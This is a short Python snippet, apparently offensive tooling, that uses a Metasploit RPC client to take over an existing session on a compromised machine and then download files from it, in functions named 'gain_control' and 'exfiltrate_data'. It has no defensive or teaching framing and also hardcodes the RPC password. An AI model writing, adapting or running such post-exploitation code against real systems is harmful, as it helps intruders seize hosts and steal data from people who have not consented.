from metasploit.msfrpc import MsfRpcClient

def gain_control(session_id):
    client = MsfRpcClient('password')
    session = client.sessions.session(session_id)
    return session

def exfiltrate_data(session, file_path):
    session.download(file_path)